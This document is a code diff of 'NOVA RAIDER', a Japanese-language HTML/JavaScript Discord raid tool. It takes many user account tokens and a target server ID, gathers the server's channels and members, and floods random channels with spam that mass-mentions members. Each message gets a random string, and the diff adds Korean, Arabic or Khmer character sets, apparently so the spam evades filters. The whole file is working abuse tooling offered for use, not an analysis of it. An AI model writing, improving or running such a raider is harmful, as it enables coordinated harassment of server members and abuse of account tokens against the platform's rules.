@@ -1,294 +1,245 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NOVA Raider Multi-Secure (Ultra)</title>
-    <style>
-        :root {
-            --bg-color: #0d0d15;
-            --card-bg: #1a1a2e;
-            --text-color: #f0f0f5;
-            --primary: #00d4ff;
-            --danger: #ff0055;
-            --success: #00ff88;
-            --border: #2e2e4a;
-        }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NOVA RAIDER - Custom Tactical</title>
+    <style>
+        :root {
+            --bg-color: #0d0d12;
+            --card-bg: #151522;
+            --text-color: #e0e0e5;
+            --primary: #00d4ff;
+            --danger: #ff0055;
+            --success: #00ff88;
+            --border: #252538;
+            --input-bg: #080810;
+        }
 
-        body {
-            font-family: 'Segoe UI', sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            display: flex;
-            justify-content: center;
-            padding: 20px;
-            margin: 0;
-        }
+        body {
+            font-family: 'Segoe UI', 'Hiragino Kaku Gothic ProN', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            padding: 20px;
+            margin: 0;
+        }
 
-        .container {
-            width: 100%;
-            max-width: 600px;
-            background: var(--card-bg);
-            padding: 30px;
-            border-radius: 16px;
-            box-shadow: 0 0 25px rgba(0, 212, 255, 0.15);
-            border: 1px solid var(--border);
-        }
+        .container {
+            width: 100%;
+            max-width: 680px;
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.6);
+            border: 1px solid var(--border);
+        }
 
-        header { text-align: center; margin-bottom: 25px; }
-        .brand-title { margin: 0; font-size: 28px; font-weight: 900; letter-spacing: 3px; color: var(--primary); text-shadow: 0 0 10px rgba(0, 212, 255, 0.4); }
-        .subtitle { font-size: 11px; text-transform: uppercase; opacity: 0.6; }
+        header { text-align: center; margin-bottom: 25px; }
+        .brand-title { margin: 0; font-size: 32px; font-weight: 900; letter-spacing: 4px; color: var(--primary); text-shadow: 0 0 15px rgba(0, 212, 255, 0.3); }
 
-        .section { margin-bottom: 15px; }
-        label { display: block; font-size: 12px; margin-bottom: 5px; color: var(--primary); font-weight: bold; }
+        .section { margin-bottom: 20px; }
+        label { display: block; font-size: 11px; margin-bottom: 6px; color: var(--primary); font-weight: bold; text-transform: uppercase; }
 
-        textarea, input {
-            width: 100%; padding: 10px; background: #0a0a1a; border: 1px solid var(--border);
-            border-radius: 8px; color: white; box-sizing: border-box; outline: none; font-family: 'Consolas', monospace;
-        }
+        textarea, input, select {
+            width: 100%; padding: 12px; background: var(--input-bg); border: 1px solid var(--border);
+            border-radius: 8px; color: white; box-sizing: border-box; outline: none; font-family: 'Consolas', monospace;
+        }
 
-        .masked { -webkit-text-security: disc !important; }
-        .view-toggle { font-size: 11px; color: var(--primary); cursor: pointer; text-align: right; margin-top: 5px; text-decoration: underline; user-select: none; }
-        .form-row { display: flex; gap: 10px; }
+        .form-row { display: flex; gap: 15px; }
+        .flex-1 { flex: 1; }
+        .flex-2 { flex: 2; }
 
-        .controls { display: flex; gap: 10px; margin-top: 20px; }
-        .btn { flex: 1; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
-        .btn-primary { background: var(--primary); color: #000; }
-        .btn-danger { background: var(--danger); color: white; }
-        .btn-danger:disabled { background: #333; opacity: 0.5; cursor: not-allowed; }
+        .controls { display: flex; gap: 12px; margin-top: 25px; }
+        .btn { flex: 1; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
+        .btn-primary { background: var(--primary); color: #000; }
+        .btn-danger { background: var(--danger); color: white; }
+        .btn:disabled { opacity: 0.3; filter: grayscale(1); }
 
-        .status-board {
-            margin-top: 20px; padding: 15px; background: rgba(0,0,0,0.3);
-            border-radius: 8px; display: flex; justify-content: space-between;
-            font-family: 'Consolas', monospace; font-size: 14px; border: 1px inset var(--border);
-        }
+        .status-panel {
+            margin-top: 20px; padding: 15px; background: rgba(0,0,0,0.3);
+            border-radius: 8px; display: flex; justify-content: space-between;
+            font-family: 'Consolas', monospace; font-size: 14px; border: 1px solid var(--border);
+        }
 
-        #logBoard {
-            margin-top: 15px; height: 120px; background: #05050a; border: 1px solid var(--border);
-            border-radius: 8px; padding: 10px; font-size: 10px; overflow-y: scroll; color: #aaa; font-family: 'Consolas', monospace;
-        }
-        .log-entry { margin-bottom: 4px; border-bottom: 1px solid #111; padding-bottom: 2px; }
-        .log-success { color: var(--success); }
-        .log-error { color: var(--danger); }
-    </style>
+        #logBoard {
+            margin-top: 15px; height: 150px; background: #05050a; border: 1px solid var(--border);
+            border-radius: 8px; padding: 10px; font-size: 11px; overflow-y: scroll; color: #888;
+        }
+        .log-entry { border-bottom: 1px solid #1a1a2a; padding: 4px 0; }
+    </style>
 </head>
 <body>
 
 <div class="container">
-    <header>
-        <h1 class="brand-title">NOVA RAIDER</h1>
-        <p class="subtitle">Next-Gen Multi-Account Automator (Global Server Mode)</p>
-    </header>
+    <header>
+        <h1 class="brand-title">NOVA RAIDER</h1>
+        <p style="font-size: 10px; opacity: 0.5; text-align: center;">V3 - MULTI-LANGUAGE ANTI-SPAM SYSTEM</p>
+    </header>
 
-    <form id="raiderForm">
-        <div class="section">
-            <label>USER TOKENS (1行に1つ)</label>
-            <div class="token-container">
-                <textarea id="tokens" class="masked" placeholder="mfa.token1&#10;mfa.token2" style="height: 80px;" required></textarea>
-                <div id="toggleBtn" class="view-toggle">トークンを表示する</div>
-            </div>
-        </div>
+    <div class="section">
+        <label>User Tokens (1 per line)</label>
+        <textarea id="tokens" style="height: 80px;" placeholder="Paste tokens here..."></textarea>
+    </div>
 
-        <div class="form-row section">
-            <div style="flex: 2;">
-                <label>GUILD (SERVER) ID</label>
-                <input type="text" id="guildId" placeholder="1234567890" required>
-            </div>
-            <div style="flex: 1;">
-                <label>INTERVAL (ms)</label>
-                <input type="number" id="interval" value="1000" min="50">
-            </div>
-        </div>
+    <div class="form-row section">
+        <div class="flex-2">
+            <label>Target Guild ID</label>
+            <input type="text" id="guildId" placeholder="1234567890">
+        </div>
+        <div class="flex-1">
+            <label>Interval (ms)</label>
+            <input type="number" id="interval" value="1000" min="50">
+        </div>
+    </div>
 
-        <div class="form-row section">
-            <div style="flex: 1;">
-                <label>メンション人数/回</label>
-                <input type="number" id="mentionCount" value="3" min="0" max="10">
-            </div>
-            <div style="flex: 1; align-self: flex-end;">
-                <p style="font-size: 10px; opacity: 0.5; margin: 0;">※全チャンネル・全ユーザーを自動取得します</p>
-            </div>
-        </div>
+    <div class="form-row section" style="background: rgba(0,212,255,0.05); padding: 15px; border-radius: 8px; border: 1px dashed var(--border);">
+        <div class="flex-2">
+            <label>Random String Language</label>
+            <select id="langSelect">
+                <option value="en">English (abcd...)</option>
+                <option value="alnum">Alphanumeric (a1b2...)</option>
+                <option value="ko">Korean (한국어)</option>
+                <option value="ar">Arabic (العربية)</option>
+                <option value="km">Khmer (ភាសាខ្មែរ)</option>
+            </select>
+        </div>
+        <div class="flex-1">
+            <label>String Length</label>
+            <input type="number" id="strLength" value="10" min="1" max="100">
+        </div>
+    </div>
 
-        <div class="section">
-            <label>MESSAGE CONTENT</label>
-            <textarea id="message" placeholder="Input your message here..." style="height: 60px;" required></textarea>
-        </div>
+    <div class="form-row section">
+        <div class="flex-1">
+            <label>Mention Count</label>
+            <input type="number" id="mentionCount" value="3" min="0" max="15">
+        </div>
+        <div class="flex-2">
+            <label>Message Content</label>
+            <input type="text" id="message" placeholder="Spam message here...">
+        </div>
+    </div>
 
-        <div class="controls">
-            <button type="submit" id="startBtn" class="btn btn-primary">NOVA 起動</button>
-            <button type="button" id="stopBtn" class="btn btn-danger" disabled>停止</button>
-        </div>
-    </form>
+    <div class="controls">
+        <button id="startBtn" class="btn btn-primary" onclick="startRaid()">NOVA 起動</button>
+        <button id="stopBtn" class="btn btn-danger" onclick="stopRaid()" disabled>停止</button>
+    </div>
 
-    <div class="status-board">
-        <span>STATUS: <strong id="statusText" style="color: #888;">READY</strong></span>
-        <span>SENT: <strong id="countText">0</strong></span>
-    </div>
+    <div class="status-panel">
+        <span>STATUS: <strong id="statusText" style="color: #666;">READY</strong></span>
+        <span>SENT: <strong id="sentCount" style="color: var(--primary);">0</strong></span>
+    </div>
 
-    <div id="logBoard">
-        <div class="log-entry">システム待機中...</div>
-    </div>
+    <div id="logBoard">
+        <div class="log-entry">システムスタンバイ完了。言語設定を確認してください。</div>
+    </div>
 </div>
 
 <script>
-    let activeRaiders = [];
-    let totalSentCount = 0;
-    let globalChannelIds = [];
-    let globalMemberIds = [];
+    let raidIntervals = [];
+    let sentCounter = 0;
+    let chs = [];
+    let mems = [];
 
-    const raiderForm = document.getElementById('raiderForm');
-    const tokensArea = document.getElementById('tokens');
-    const toggleBtn = document.getElementById('toggleBtn');
-    const startBtn = document.getElementById('startBtn');
-    const stopBtn = document.getElementById('stopBtn');
-    const statusText = document.getElementById('statusText');
-    const countText = document.getElementById('countText');
-    const logBoard = document.getElementById('logBoard');
+    const charSets = {
+        en: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
+        alnum: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
+        ko: "가나다라마바사아자차카타파하거너더러머버서어저처커터퍼허기니ディリミビシイジチキティピヒ", // ハングル
+        ar: "ابتثجحخدذرزسشصضطظعغفقكلمنهوي", // アラビア文字
+        km: "កខគឃងចឆជឈញដឋឌឍណតថទធនបផពភមយរលវសហឡអ" // クメール文字
+    };
 
-    // トークン表示切り替え
-    toggleBtn.addEventListener('click', () => {
-        const isMasked = tokensArea.classList.toggle('masked');
-        toggleBtn.innerText = isMasked ? "トークンを表示する" : "トークンを隠す";
-    });
+    function addLog(msg, color = "") {
+        const board = document.getElementById('logBoard');
+        const div = document.createElement('div');
+        div.className = 'log-entry';
+        if (color) div.style.color = color;
+        div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        board.prepend(div);
+    }
 
-    // ログ出力
-    function addLog(msg, type = '') {
-        const div = document.createElement('div');
-        div.className = `log-entry ${type}`;
-        div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-        logBoard.prepend(div);
-    }
+    function generateRandomStr(lang, len) {
+        let result = "";
+        const characters = charSets[lang] || charSets.en;
+        for (let i = 0; i < len; i++) {
+            result += characters.charAt(Math.floor(Math.random() * characters.length));
+        }
+        return result;
+    }
 
-    // ランダム文字列生成
-    function generateStrongRandom() {
-        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-        let result = "\n"; 
-        for (let i = 0; i < 15; i++) {
-            result += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        return result;
-    }
+    async function startRaid() {
+        const tokens = document.getElementById('tokens').value.split(/\r?\n/).filter(t => t.trim() !== "");
+        const guildId = document.getElementById('guildId').value.trim();
+        const interval = parseInt(document.getElementById('interval').value);
+        const lang = document.getElementById('langSelect').value;
+        const len = parseInt(document.getElementById('strLength').value);
 
-    // API: 全チャンネル取得
-    async function fetchAllChannels(guildId, token) {
-        try {
-            const res = await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, {
-                headers: { 'Authorization': token.trim() }
-            });
-            const data = await res.json();
-            if (!Array.isArray(data)) return [];
-            // Type 0:Text, 2:Voice, 5:News
-            return data.filter(c => [0, 2, 5].includes(c.type)).map(c => c.id);
-        } catch (e) { return []; }
-    }
+        if (!tokens.length || !guildId) return alert("入力エラー: トークンまたはサーバーIDが空です。");
 
-    // API: 全メンバー取得 (最大1000)
-    async function fetchGuildMembers(guildId, token) {
-        try {
-            const res = await fetch(`https://discord.com/api/v9/guilds/${guildId}/members?limit=1000`, {
-                headers: { 'Authorization': token.trim() }
-            });
-            const data = await res.json();
-            if (!Array.isArray(data)) return [];
-            return data.map(m => m.user.id);
-        } catch (e) { return []; }
-    }
+        document.getElementById('startBtn').disabled = true;
+        document.getElementById('stopBtn').disabled = false;
+        document.getElementById('statusText').innerText = "RUNNING";
+        document.getElementById('statusText').style.color = "var(--success)";
 
-    // 個別トークンの送信タスク
-    async function executeTask(token, intervalMs) {
-        const raiderId = setInterval(async () => {
-            if (globalChannelIds.length === 0) return;
+        addLog("サーバーデータ取得中...", "var(--primary)");
 
-            // ランダムに1つチャンネルを選択
-            const targetChannel = globalChannelIds[Math.floor(Math.random() * globalChannelIds.length)];
-            
-            // メンション作成
-            let mentions = "";
-            const mCount = parseInt(document.getElementById('mentionCount').value);
-            if (mCount > 0 && globalMemberIds.length > 0) {
-                const shuffled = [...globalMemberIds].sort(() => 0.5 - Math.random());
-                mentions = shuffled.slice(0, mCount).map(id => `<@${id}>`).join(" ");
-            }
+        try {
+            const res = await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, {
+                headers: { 'Authorization': tokens[0] }
+            });
+            const data = await res.json();
+            chs = data.filter(c => [0, 5].includes(c.type)).map(c => c.id);
 
-            const messageBase = document.getElementById('message').value;
-            const finalMessage = `${mentions} ${messageBase} ${generateStrongRandom()}`;
+            const res2 = await fetch(`https://discord.com/api/v9/guilds/${guildId}/members?limit=1000`, {
+                headers: { 'Authorization': tokens[0] }
+            });
+            const data2 = await res2.json();
+            mems = Array.isArray(data2) ? data2.map(m => m.user.id) : [];
 
-            try {
-                const res = await fetch(`https://discord.com/api/v9/channels/${targetChannel}/messages`, {
-                    method: 'POST',
-                    headers: {
-                        'Authorization': token.trim(),
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ content: finalMessage })
-                });
+            addLog(`${chs.length}個のチャンネルを捕捉。攻撃を開始します。`, "var(--success)");
+        } catch (e) {
+            addLog("初期化エラー。トークンの権限を確認してください。", "var(--danger)");
+        }
 
-                if (res.ok) {
-                    totalSentCount++;
-                    countText.innerText = totalSentCount;
-                    addLog(`送信成功: ${token.substring(0,10)}... -> CH:${targetChannel}`, 'log-success');
-                } else if (res.status === 403) {
-                    addLog(`権限なし無視: CH:${targetChannel}`, 'log-error');
-                } else if (res.status === 429) {
-                    addLog(`制限(429)検知: 待機してください`, 'log-error');
-                }
-            } catch (err) {
-                console.error(err);
-            }
-        }, intervalMs);
-        
-        activeRaiders.push(raiderId);
-    }
+        tokens.forEach((token, i) => {
+            const inv = setInterval(async () => {
+                const target = chs[Math.floor(Math.random() * chs.length)];
+                const mCount = parseInt(document.getElementById('mentionCount').value);
+                let mentions = "";
+                if (mCount > 0 && mems.length > 0) {
+                    mentions = [...mems].sort(() => 0.5 - Math.random()).slice(0, mCount).map(id => `<@${id}>`).join(" ");
+                }
 
-    // フォーム送信
-    raiderForm.addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const tokenList = tokensArea.value.split(/\r?\n/).filter(t => t.trim() !== "");
-        const guildId = document.getElementById('guildId').value.trim();
-        const intervalMs = parseInt(document.getElementById('interval').value);
+                const randStr = generateRandomStr(lang, len);
+                const content = `${mentions} ${document.getElementById('message').value} \n**${randStr}**`;
 
-        if (tokenList.length === 0) return alert("トークンを入力してください");
+                try {
+                    const post = await fetch(`https://discord.com/api/v9/channels/${target}/messages`, {
+                        method: 'POST',
+                        headers: { 'Authorization': token, 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content })
+                    });
+                    if (post.ok) {
+                        sentCounter++;
+                        document.getElementById('sentCount').innerText = sentCounter;
+                    }
+                } catch (err) {}
+            }, interval + (i * 10));
+            raidIntervals.push(inv);
+        });
+    }
 
-        startBtn.disabled = true;
-        stopBtn.disabled = false;
-        statusText.innerText = "FETCHING...";
-        addLog("サーバー情報を取得中...");
-
-        // 初回データ取得
-        const mainToken = tokenList[0];
-        globalChannelIds = await fetchAllChannels(guildId, mainToken);
-        globalMemberIds = await fetchGuildMembers(guildId, mainToken);
-
-        if (globalChannelIds.length === 0) {
-            addLog("チャンネルが1つも取得できませんでした。中断します。", "log-error");
-            stopBtn.click();
-            return;
-        }
-
-        addLog(`${globalChannelIds.length}個のチャンネル、${globalMemberIds.length}名のユーザーを捕捉。`);
-        statusText.innerText = "RUNNING";
-        statusText.style.color = "#00d4ff";
-
-        // 各トークンを別のプロセスとして起動
-        tokenList.forEach((token, index) => {
-            setTimeout(() => {
-                addLog(`Instance #${index+1} 起動開始`);
-                executeTask(token, intervalMs);
-            }, index * 300); // 起動タイミングを少しずらして負荷分散
-        });
-    });
-
-    // 停止ボタン
-    stopBtn.addEventListener('click', () => {
-        activeRaiders.forEach(id => clearInterval(id));
-        activeRaiders = [];
-        startBtn.disabled = false;
-        stopBtn.disabled = true;
-        statusText.innerText = "STOPPED";
-        statusText.style.color = "#ff0055";
-        addLog("すべての処理を停止しました。");
-    });
+    function stopRaid() {
+        raidIntervals.forEach(clearInterval);
+        raidIntervals = [];
+        document.getElementById('startBtn').disabled = false;
+        document.getElementById('stopBtn').disabled = true;
+        document.getElementById('statusText').innerText = "STOPPED";
+        document.getElementById('statusText').style.color = "var(--danger)";
+        addLog("全インスタンスを停止しました。", "orange");
+    }
 </script>
 
 </body>
